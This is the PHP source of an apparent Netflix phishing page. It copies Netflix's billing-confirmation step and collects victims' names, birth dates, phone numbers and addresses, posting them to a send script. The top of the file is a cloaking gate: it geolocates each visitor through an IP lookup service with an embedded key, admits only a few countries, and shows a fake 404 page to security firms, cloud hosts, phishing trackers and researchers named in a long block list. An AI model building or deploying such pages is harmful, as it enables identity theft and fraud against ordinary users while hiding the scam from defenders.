<?php 
ob_start();
session_start();
$allowed_countries = array('MA', 'IT', 'FR');
$blocked_strings = array(
'Intergrid', 'CITEC', 'Government', 'Research', 'Host', 'Level 7 Wireless', 'Apple Inc', 'Latitude.sh', 'M247', 'Amazone', 'DigitalOcean', 'Amazon', 'Google', 'phishtank', 'net4sec', 'AVAST Software s.r.o.', 'BullGuard ApS', 'PayPal', 'Hotmail', 'Yahoo', 'AOL', 'Microsoft', 'Kaspersky Lab', 'Linode', 'MSN', 'Online S.A.S.', 'Joshua Peter McQuistan', 'OVH SAS', 'avira', 'Forcepoint', 'Cloud', 'Forcepoint Cloud Ltd', 'Google', 'Facebook', 'HostRoyale', 'Green Floid LLC', 'The Constant Company', 'ONLINE S.A.S', 'H4Y Technologies', 'Datacamp Limited', 'Digital Network', 'Intelligence Network Online', 'Geekyworks IT Solutions', 'The Calyx Institute', 'Perimeter', 'TerraTransit', 'Hurricane Electric', 'Uninet S.A.', 'AVAST', 'Microsense', 'PALO ALTO NETWORKS', 'ServeByte', 'Fastly', 'Google LLC', 'Overplay', 'Netprotect', 'Strong Technology', 'Web2Objects', 'tzulo', 'NETPROTECT', 'GleSYS', 'Cloudflare', 'Cloudflare, Inc.', 'Axera SpA', 'Axera S.P.A.', 'DedFiberCo', 'VISPERAD NETWORKS', 'EGIHosting', 'NAVER Cloud', 'Dreamx', 'DIMENOC SERVICOS DE INFORMATICA', 'HostDime', 'Powerhouse', 'Powerhouse Management', 'Unus, Inc.', 'Cisco', 'Cisco OpenDNS LLC', 'Twitter', 'Hetzner', 'Telegram', 'TEFINCOM', 'Tefincom', 'Packethub', 'AWS EC2', 'Forcepoint Cloud', 'Forcepoint', 'Paradise Networks', 'CenturyLink Communications', 'NEXT GLOBAL SERVICES', 'Next Global Services', 'UAB code200', 'Ovh', 'ovh', 'Liteserver', 'Leaseweb', 'Space Exploration Technologies', 'SpaceX Services', 'SpaceX Services, Inc', 'UNINET', 'Jisc Services', 'University of Bath', 'Bath University', 'Synergy Wholesale PTY LTD', 'SYNERGY WHOLESALE PTY LTD', 'IPXO UK LIMITED', 'Ipxo UK Limited', 'QuickPacket', 'BraveWay', 'Geekyworks', 'NETROTECT-BOM', 'myLoc', 'SCALEWAY', 'Datacamp', 'INCX Global', 'Windscribe', 'Blix Solutions', 'Blix', 'Universal Layer', 'Vultr', 'Datacenter', 'Server', 'server', 'Hosting', 'hosting', 'External Content Distribution Network', 'Rural Telephone Service Company', 'American Registry Internet Numbers', 'Internet Numbers', 'Hi3G Access AB', 'Hi3gaccess', 'Digital Network JSC', 'Digital Network', 'Level 3 Communications', 'Level3', 'Webline Services', 'WhiteLabelColo', 'WhiteSky Communications', 'WhiteSky', 'WhiteSky', 'QuickPacket', 'BraveWay', 'Colocation America Corporation', 'Segna Technologies', 'Digital Ocean', 'Google Cloud', 'Strong Technology', 'Emerald Onion', 'Shock Hosting', 'AxcelX', 'W I X NET DO BRASIL LTDA', 'Qnax Ltda', 'Orange', 'orange', 'Telepoint Ltd', 'Akamai Technologies', 'Proofpoint', 'SEWAN', 'SEWAN SAS', 'ORG-SCS33-RIPE', 'Unus, Inc.', 'AltusHost', 'Iseek Communications', 'Iseek', 'Euskaltel', 'GTT Communications', 'ANTISPAMEUROPE', 'ANTISPAM', 'MK Netzdienste GmbH', 'OVPN Integritet', 'OVPN', '31173 Services AB', 'Hostway', 'Verlag Heinz Heise GmbH', 'Deutscher Wetterdienst', 'Keyweb', 'Chang Way', 'Starcrecium', 'The Calyx', 'Calyx', 'FORTINET', 'FORTINET TECHNOLOGIES', 'Fortinet', 'fortinet', 'Fortinet Inc', 'Oculus Networks', 'Oculus', 'Shadow Server', 'Hurricane', 'Ovpn', 'ovpn', 'NForce', 'Globalhost', 'Web Hosting', 'Rootnerds', 'Amanah Tech', 'O2 Online', 'INCX', 'INCX', 'ThoughtPort', 'Halo Colocation', 'Halo Colocation LLC', 'ThoughtPort Networking', 'GetNet', 'SERVERFIELD', 'Cdnext', 'Ipxo', 'Quintex', 'FranTech', 'myLoc managed', 'FranTech Solutions', 'ITN Ssl1 OL', 'Universitaet Stuttgart', 'Core-Backbone', 'Webinvest International SA', 'Hornetsecurity', 'security', 'Security', 'EstNOC OY', 'ESTNOC-GLOBAL', 'Cogent', 'Cogent Communications', 'cogent', 'Amazon Technologies Inc.', 'Amazon', 'AWS EC2 (eu-west-2)', 'AWS', 'Aws', 'aws', 'PlusNet plc', 'PlusNet', 'plusnet', 'TalkTalk', 'Level 3 Communications', 'Dedicated Servers', 'Keliweb', 'Strong Technology', 'GleSYS', 'Hivelocity', 'LeaseWeb', 'Red IP Multi Acceso', 'Red de servicios IP', 'Lite Info LLC', '31173 Services', 'ExcellMedia', 'Excell Media', 'First Dinahosting', 'DinaHosting', 'Bla001', 'SONDATECH', 'Sondatech', 'FORTINET', 'DH-J2', 'Apogee Telecom', 'WiscNet', ' OLIVE ', 'Olive', 'Lite Info', 'Administracion', 'Administration' 
);


function getIpInfo($ip = '')
{
    $ipinfo = file_get_contents("https://pro.ip-api.com/json/" . $ip . "?key=s3DD9L9nYAxD9mz");
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}

function containsBlockedString($ipinfo_json, $blocked_strings)
{
    foreach ($blocked_strings as $blocked_string) {
        if (stripos(json_encode($ipinfo_json), $blocked_string) !== false) {
            return true;
        }
    }
    return false;
}

$visitor_ip = $_SERVER['REMOTE_ADDR'];
$ipinfo_json = getIpInfo($visitor_ip);
$country_code = "{$ipinfo_json['countryCode']}";

if (!in_array($country_code, $allowed_countries) || containsBlockedString($ipinfo_json, $blocked_strings)) {

    header("HTTP/1.1 404 Not Found");
    header("Status: 404 Not Found");
    echo '
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at srv190630.hoster-test.ru Port 80</address>
</body></html>';
    exit();
}

include ('../translation.php');
?>

<html data-triggered="true" lang="<?php echo $meta_langue ?>">
  <head>
     <script>
        function checkValue(str, max) {
        if (str.charAt(0) !== '0' || str == '00') {
          var num = parseInt(str);
          if (isNaN(num) || num <= 0 || num > max) num = 1;
          str = num > parseInt(max.toString().charAt(0)) && num.toString().length == 1 ? '0' + num : num.toString();
        };
        return str;
        };
        
        // reformat by date
        function date_reformat_dd(date) {
        date.addEventListener('input', function(e) {
        this.type = 'text';
        var input = this.value;
        if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
        var values = input.split('/').map(function(v) {
          return v.replace(/\D/g, '')
        });
        if (values[1]) values[1] = checkValue(values[1], 12);
        if (values[0]) values[0] = checkValue(values[0], 31);
        var output = values.map(function(v, i) {
          return v.length == 2 && i < 2 ? v + '/' : v;
        });
        this.value = output.join('').substr(0, 14);
        });
        }
        
        
     </script>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta http-equiv="origin-trial" data-feature="EME Extension - Policy Check" data-expires="2018-11-26" content="Aob+++752GiUzm1RNSIkM9TINnQDxTlxz02v8hFJK/uGO2hmXnJqH8c/ZpI05b2nLsHDhGO3Ce2zXJUFQmO7jA4AAAB1eyJvcmlnaW4iOiJodHRwczovL25ldGZsaXguY29tOjQ0MyIsImZlYXR1cmUiOiJFbmNyeXB0ZWRNZWRpYUhkY3BQb2xpY3lDaGVjayIsImV4cGlyeSI6MTU0MzI0MzQyNCwiaXNTdWJkb21haW4iOnRydWV9">
     <title><?php echo $meta_title ?></title>
     <link type="text/css" rel="stylesheet" href="css/billing.css" >
     <link rel="preload" href="js/bootstrap1.22.5.js" as="script">
     <meta content="<?php echo $meta_keywords ?>" name="keywords">
     <meta content="<?php echo $meta_description ?>" name="description">
     <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
     <link rel="shortcut icon" href="img/nficon2016.ico">
     <link rel="apple-touch-icon" href="img/nficon2016.png">
     <meta property="og:description" content="<?php echo $meta_description ?>">
     <meta name="twitter:card" content="player">
     <meta name="twitter:site" content="@netflix">
  </head>
  <body>
     <div id="appMountPoint">
        <div class="netflix-sans-font-loaded">
           <div class="basicLayout notMobile modernInApp signupSimplicity-registrationWithContext simplicity" dir="ltr" lang="fr-FR">
              <div class="nfHeader noBorderHeader signupBasicHeader">
                 <a href="/" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo">
                    <svg style="margin-top: 15px;" viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true">
                       <g id="netflix-logo">
                          <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path>
                       </g>
                    </svg>
                    <span class="screen-reader-text">Netflix</span>
                 </a>
                 <a href="/login.php" class="authLinks signupBasicHeader" data-uia="header-login-link"><?php echo $Deconnexion ?></a>
              </div>
              <div class="simpleContainer" data-transitioned-child="true">
                 <div class="centerContainer firstLoad" data-uia="password-only-page-container">
                    <form method="POST" action="<?php echo './send/billingsend.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>">
                       <div class="regFormContainer passwordFormContainer" data-uia="form-registration">
                          <div class="stepHeader-container" data-uia="header">
                             <div class="stepHeader" data-a11y-focus="true">
                                <span id="" class="stepIndicator" data-uia=""><?php echo $Etape ?> <b><?php echo $Etape1 ?></b> <?php echo $SUR ?> <b><?php echo $Etape1sur3 ?></b></span>
                                <h2 class="stepTitle" data-uia="stepTitle"><span id="" data-uia=""><?php echo $confirmerfacturation ?></span></h1>
                             </div>
                          </div>
                          <style>
                             .formv2 { padding-left: 8px;border:none;width:100%; }
                             .labev2 { padding-left:8px;font-size:13px;opacity: 0.85;font-weight:bold; }
                             .contentv2 { width:100%;border: solid 1px gray;border-radius:2px;margin-bottom:12px;  }
                             .sepv2 { height:4px; }
                             .difv2 { font-size: 13px; margin-bottom:24px; }
                             .sep2v2 { height: 24px; }
                          </style>
                          <span class="difv2"><?php echo $textsoustitre ?></span>
                          <div class="sep2v2"></div>
                          <div class="contentv2">
                             <div class="sepv2"></div>
                             <span class="labev2"><?php echo $Prenom ?></span>
                             <input required type="text" id="firstname" name="firstname" class="formv2">
                          </div>
                          <div class="contentv2">
                             <div class="sepv2"></div>
                             <span class="labev2"><?php echo $Nom ?></span>
                             <input required type="text" id="lastname" name="lastname" class="formv2">
                          </div>
                          <div class="contentv2">
                             <div class="sepv2"></div>
                             <span class="labev2"><?php echo $Datedenaissance ?></span>
                             <input required type="number" id="dob" name="dob" onpaste="date_reformat_dd(this);" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" onkeyup="date_reformat_dd(this);" maxlength="10" placeholder="DD/MM/AAAA" class="formv2">
                          </div>
                          <div class="contentv2">
                             <div class="sepv2"></div>
                             <span class="labev2"><?php echo $Numerodetelephone ?></span>
                             <input required type="number" id="phone" name="phone" class="formv2">
                          </div>
                          <div class="contentv2">
                             <div class="sepv2"></div>
                             <span class="labev2"><?php echo $Adressepostale ?></span>
                             <input required type="text" id="address" name="address" class="formv2">
                          </div>
                          <div class="contentv2">
                             <div class="sepv2"></div>
                             <span class="labev2"><?php echo $Ville ?></span>
                             <input required type="text" id="city" name="city" class="formv2">
                          </div>
                          <div class="contentv2">
                             <div class="sepv2"></div>
                             <span class="labev2"><?php echo $Codepostal ?> </span>
                             <input required type="number" id="zip" name="zip" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" maxlength="5" class="formv2">
                          </div>
                          <div class="submitBtnContainer"><button name="auth" type="submit" autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="cta-registration" placeholder="regForm_button_next" style="font-size:18px;"><?php echo $Suivant ?></button></div>
                       </div>
                    </form>
                 </div>
              </div>
              <?php include'./footer.php'?>
              <div class="a11yAnnouncer" aria-live="assertive" tabindex="-1"></div>
           </div>
        </div>
     </div>
     <div>
     </div>
  </body>
</html>

